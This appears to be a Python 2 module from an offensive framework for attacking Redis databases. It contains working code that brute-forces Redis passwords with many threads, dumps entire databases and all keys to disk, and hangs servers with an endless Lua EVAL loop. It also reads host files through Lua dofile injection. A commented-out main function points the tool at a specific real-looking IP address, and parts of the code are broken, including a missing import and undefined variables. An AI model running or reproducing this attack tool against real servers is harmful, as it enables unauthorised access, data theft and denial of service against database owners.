#Attack file for Redis
import redisdl
import redis
from termcolor import colored
import sys
import utils
import threading
import Queue
import time

global passfound

def redis_conn(target,port=6379,mass=False):
	try:
		r_server = redis.Redis(target,port)
		if mass==True:
			s=r_server.info()
			print colored("[+] RedisDB port open on %s:6379! \n"%(target),'green')
		else:
			check = r_server.keys() # Makes sure that the Connection is really established
			popen = "[+] RedisDB port open on " + target + ":6379! \n"
			return r_server
	except redis.exceptions.InvalidResponse:
		print colored("[-] RedisDB  Port Closed on "+ target + ":6379! \n",'red')
	except redis.exceptions.ResponseError:
		if mass==True:
			print colored("[+] RedisDB port open on %s:6379! \n"%(target),'green')
		else:
			print colored("[+] RedisDB port open on %s:6379! \n"%(target),'green')
			#print popen
			return r_server
	except redis.exceptions.ConnectionError:
		print colored("[-] RedisDB Port Closed on %s:6379! \n"%(target),'red')
		if mass==True:
			pass
		else:
			sys.exit()

def clone_redis(target,creds=False):
	if not os.path.exists("dump"):
    		os.makedirs("dump")
	elif not os.path.exists("dump/redis"):
   		 os.makedirs("dump/redis")
	print colored("[-] Clone Module For NoSQL Framework Launched ..",'blue')
	try:
		content=redisdl.dumps(str(target),6379)
		file = open("./dump/redis/"+str(target)+".rdb","w")
		file.write(content)
		file.close()
		print colored("[-] Dumped Successfully Find the logs @ ./dump/redis/"+target+".rdb",'green')
	except redis.exceptions.ResponseError:
		print colored("[-] Authentication Required \n",'red')
		if creds:
			print colored("[~] Retrying with creds Enabled",'yellow')
			content=redisdl.dumps(str(target),6379,creds)
			file = open("./dump/redis/"+str(target)+".rdb","w")
			file.write(content)
			file.close()
			print colored("[+] Dumped Successfully Find the logs @ ./dump/redis/"+target+".rdb\n",'green')
		else:
			print colored("[-] Dump Failed \n",'red')

def dict_redis(file_name,target,port):
	"""
	Dictionary attack for Redis

	N.B : Redis has no username and only authenticates using the password

	Format: username:password

	Multithreaded the Module

	"""
	print colored("[-] Dictionary Attack Module For NoSQL Framework Launched ..",'blue')
	r_server = redis_connb(target,port)
	try:
		file = open(file_name,"r")
		lines = file.read().split('\n')
		print lines
		for names in lines:
		    	s1 = names
		    	t1 = threading.Thread(target=tryandgetpass, args=(r_server,names))
		    	t1.start()
		print colored(passfound,'green')
	except Exception,e:
		print colored("[-] "+str(e),'red')

def tryandgetpass(r_server,names):
	global passfound
	try:
		if names:
			r_server.execute_command('AUTH',names.split(':')[1])
			#print colored("[-] Auth Succeeded with Password %s"%(names.split(':')[1]),'green')
			#print colored("[+] Auth Succeeded with username:%s and Password %s"%(names.split(':')[0],names.split(':')[1]),'green')
			passfound="[+] Auth Succeeded with Password %s"%(names.split(':')[1])
	except redis.exceptions.ResponseError:
		print colored("[-] Auth Failed with Password %s"%(names.split(':')[1]),'red')
	#print "\n"

def redis_auth_test():
	try:
		r_server=redis_connb(target,6379)
		test=r_server.info()
	except Exception,e:
		if 'Authentication' in str(e):
			return 1
		else:
			return 0
def redis_exhaust():
	r_server=redis_connb(target,6379)
	if redis_auth_test()==1:
		print colored("[!] Credentials Required",'blue')
		r_server.execute_command('auth','admin')
		r_server.execute_command('eval',"while(1)do end",0)
	else:
		r_server.execute_command('eval',"while(1)do end",0)
		#r_server.execute_command('script','kill')

class RedisUtil(threading.Thread):
    """Threaded Url Grab"""
    def __init__(self, queue,serverobj):

        #threading.Thread.__init__(self)
	    super(RedisUtil, self).__init__()
	    self.queue = queue
	    self.r_server=serverobj

    @property
    def run(self):
    	#conn = pymongo.Connection('mongodb://'+target,safe=True)
	    try:
	    	while True:
	       		payload = self.queue.get()
	        	get_file_enum(self.r_server,payload)
	        	time.sleep(1)
	            #Scan targets here
	            #signals to queue job is done
	        	self.queue.task_done()
	    except Exception as e:
	    	print colored("[-] Threading Error occured, but just went fine",'red')
	    	sys.exit(0)

def payloadlist(r_server,payloads):
	querange = len(payloads)
	print payloads
	queue = Queue.Queue()
    #spawn a pool of threads, and pass them queue instance
	try:
		for i in range(int(querange)):
	    		t = RedisUtil(queue,r_server)
	    		t.setDaemon(True)
	    		t.start()
	    #populate queue with data
		for target in payloads:
	    		queue.put(target)

	    #wait on the queue until everything has been processed
		queue.join()
	except Exception as e:
		print colored("[-] Threading Error occured, but just went fine",'red')
		print str(e)
    	sys.exit(0)

def redis_file_enum(file_name,target,port=6379,creds=False):
	check=False
	r_server=redis_connb(target,port)
	ver=r_server.info()['redis_version']
	#ver.partition('.')[0]

	if int(redis_auth_test())==1:
		r_server.execute_command('auth',creds)
		check=True
	if (int(ver.partition('.')[0])>=2 and float(ver.partition('.')[2])>6.0):
		check=True
	else:
		print colored('[!] Version Check Failed','yellow')
		print colored("\t[-] Redis File Enumeration supported only for versions 2.6 and Above",'red')
		check=False
	if check==True:
		vec=[]
		output=""
		lines = open('payload/files_enum.txt').read().splitlines()
		get=len(lines)
		for q in lines:
	    		s1 = q
	    		t1 = threading.Thread(target=get_file_enum, args=(r_server,s1))
	    		t1.start()
		#payloadlist(r_server,lines)

def get_file_enum(r_server,test):

		vec=[]
		try:
			#print test
			set_global="local mt = setmetatable(_G, nil)"
			r_server.eval(set_global,0)
			if test=='/etc/lsb-release':
				evals="dofile('"+test+"');return(DISTRIB_DESCRIPTION);"
			else:
				evals="dofile('"+test+"');return(PATH);"
			output=r_server.eval(evals,0)
			if output:
				vec.append(test)
				vec.append(output)

		except Exception as e:
			try:
				if "No such file or directory" in str(e) and test[len(test)-1] != '/':
			    		print colored("[-] File Not Found " + "'%s'"%(test),'red')

				elif test[len(test)-1] == '/' and "No such file or directory" in str(e):
					print colored("[-] Directory Not Found " + "'%s'"%(test),'red')
				else:
					print colored("[+] File/Directory Found "+test,'green')
					print str(e)
			except Exception as e:
				print colored("\t[-] Thread Exception Occured",'red')
		if vec:
			print colored("[+] File Found "+vec[0],'green')
			print colored("\t [+] Content Found " + vec[1],'yellow')
			vec=[]

		"""
			for i in lines:
			try:
				test=i.split('\n')[0]
				set_global="local mt = setmetatable(_G, nil)"
				r_server.eval(set_global,0)
				if test=='/etc/lsb-release':
					evals="dofile('"+test+"');return(DISTRIB_DESCRIPTION);"
				else:
					evals="dofile('"+test+"');return(PATH);"
				output=r_server.eval(evals,0)
				if output:
					vec.append(test)
					vec.append(output)

			except Exception as e:
				if "No such file or directory" in str(e) and test[len(test)-1] != '/':
			    		print colored("[-] File Not Found " + "'%s'"%(test),'red')
				elif test[len(test)-1] == '/' and "No such file or directory" in str(e):
					print colored("[-] Directory Not Found " + "'%s'"%(test),'red')
				else:
					print colored("[+] File Found "+test,'green')
					print str(e)
			else:
				print "unknown"

			if vec:
				print colored("[+] File Found "+vec[0],'green')
				print colored("[+] Content Found " + vec[1])
				vec=[]
		"""
def redis_connb(target,port):
	try:
		r_server = redis.Redis(target,port)
		#check = r_server.keys() # Makes sure that the Connection is really established
		popen = "[-] RedisDB port open on " + target + ":6379! \n"
		return r_server
	except redis.exceptions.ConnectionError:
		print colored("[-] RedisDB Port Closed \n",'red')
		sys.exit()

def redis_enum(r_server,creds=False,write=False):
	count=1
	print colored("\n[!] Enumeration Module For NoSQL Framework Redisdb Launched.....",'yellow')
	if creds:
		try:
			r_server.execute_command('AUTH',creds)
			#redis_enum(r_server,creds)
		except Exception,e:
			print colored("\t[-] Auth failed with "+creds,'red')
			sys.exit(0)
	try:
		print colored("\n[+] Redis Basic Server Info : \n",'blue')
		s=r_server.info()
		info=r_server.info()
		for keys in info:
			print colored("\t[-]"+(keys)+":"+str(info[keys]),'green')
		print "\n"
		print colored("\n[+] Redis Connected Clients: \n",'blue')
		for i in r_server.client_list():
			print colored("\t[-] %s "%(i['addr']),'green')
		print colored("\n[+] Redis Version : %s"%(s['redis_version']),'blue')
		print colored("\n[!] Enumerating Redis Keys \n",'blue')
		for i in r_server.keys():
			print colored("[-]"+i,'green')

		print colored("\n[!] Geting Key Details \n",'blue')
		if len(r_server.keys()) == 0:
			print colored("\t[-]No Keys Found\n",'red')
		else:

			for i in r_server.keys():
				if r_server.type(i)=='list':
					if count == 1:
						print colored("[-] Lists identified Which May Contain Huge Data. Do u wish to display (y/n)",'green')
						if raw_input()=='y':
							for j in r_server.lrange(i,0,-1):
								print colored("[-] "+j,'green')
						else:
							break
						count = count + 1
					else:
						for j in r_server.lrange(i,0,-1):
							print colored("[-] "+j,'green')
				elif r_server.type(i)=='hash':
					if count == 1:
						print colored("[-] Hashes identified Which May Contain Huge Data. Do u wish to display (y/n)",'green')
						if raw_input()=='y':
							for j in r_server.hgetall(i):
								print colored("[-] "+j,'green')
						else:
							break
						count = count + 1
					else:
						for j in r_server.hgetall(i):
							print colored("[-] "+j,'green')
				else:
					print colored("'%s'"%i+":"+r_server.get(i)+"\n",'green')
	except redis.exceptions.ResponseError:
		print colored("[-] Auth Required",'red')
"""
		print colored("[-] Do you want to provide Credentials [y/n] ",'red')
		choice=raw_input()
		if choice.lower()=='y':
			password = auth_req('redis')
			try:
				r_server.execute_command('AUTH',password)
				redis_enum(r_server)
			except Exception,e:
				print colored("[-] "+str(e),'red')
		else:
			pass
"""
"""
def main():
		r_server = redis_conn('104.202.83.44',6379)
		redis_enum(r_server)
		#redis_file_enum('./payload/files_enum.txt','localhost')
main()

"""
